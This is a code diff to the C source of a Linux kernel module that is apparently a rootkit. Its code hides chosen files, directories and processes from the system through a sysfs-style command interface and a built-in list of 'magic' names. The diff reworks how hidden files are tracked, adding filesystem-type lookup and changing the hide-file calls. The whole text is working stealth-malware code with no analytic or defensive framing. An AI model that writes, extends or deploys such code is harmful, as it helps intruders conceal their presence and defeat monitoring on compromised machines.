@@ -26,6 +26,7 @@
 #include <linux/ctype.h>
 #include <linux/parser.h>
 #include <linux/random.h>
+#include <linux/statfs.h>
 
 #include "crypto.h"
 #include "lkm.h"
@@ -107,11 +108,7 @@ struct module_sect_attrs {
 // Mostly copycat from the kernel with
 // light modifications to handle only a subset
 // of sysfs files
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 14, 0)
-static ssize_t show_refcnt(const struct module_attribute *mattr,
-#else
 static ssize_t show_refcnt(struct module_attribute *mattr,
-#endif
 			   struct module_kobject *mk, char *buffer)
 {
 	return sprintf(buffer, "%i\n", module_refcount(mk->mod));
@@ -588,23 +585,29 @@ static int _hide_path(const char *s)
 	int rc = -EINVAL;
 
 	if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
-		// It is filename, no problem because we have path.dentry
-		const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
-		bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
+		const char *file =
+			kstrdup(path.dentry->d_name.name, GFP_KERNEL);
 
-		if (is_dir) {
-			u64 parent_inode = fs_get_parent_inode(&path);
-			rc = fs_add_name_rw_dir(f, stat.ino, parent_inode,
-						/*is_dir=*/true);
+		// Everything but directories
+		bool is_file = !((stat.mode & S_IFMT) == S_IFDIR);
+		if (is_file) {
+			struct kstatfs kstatfs = { 0 };
+			if (vfs_statfs(&path, &kstatfs) == 0) {
+				prinfo("f_type for '%s' is %ld\n", s,
+				       kstatfs.f_type);
+				rc = fs_add_name_rw(file, &stat, &path,
+						    kstatfs.f_type);
+			} else {
+				rc = fs_add_name_rw(file, &stat, &path, 0);
+			}
 		} else {
-			rc = fs_add_name_rw(f, stat.ino);
+			u64 parent_inode = fs_get_parent_inode(&path);
+			rc = fs_add_name_rw_dir(file, &stat, &path,
+						parent_inode, true);
 		}
 
 		path_put(&path);
-		kv_mem_free(&f);
-	} else if (*s != '.' && *s != '/') {
-		// add with unknown inode number
-		rc = fs_add_name_rw(s, /*ino=*/0);
+		kfree(file);
 	}
 
 	return rc;
@@ -687,7 +690,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			// Currently, directories must
 			// be added individually: use hide-directory
 		case Opt_hide_file_anywhere:
-			rc = fs_add_name_rw(args[0].from, 0);
+			rc = fs_add_name_rw(args[0].from, NULL, NULL, 0);
 			_set_msguser_retcode(&rc, MSG_INT);
 			break;
 		case Opt_list_hidden_files:
@@ -1001,7 +1004,7 @@ static int __init kv_init(void)
 
 	// hide magic filenames, directories and processes
 	for (name = hide_names; *name != NULL; ++name) {
-		fs_add_name_ro(*name, 0);
+		fs_add_name_ro(*name, NULL, NULL);
 	}
 
 #ifndef DEBUG_RING_BUFFER
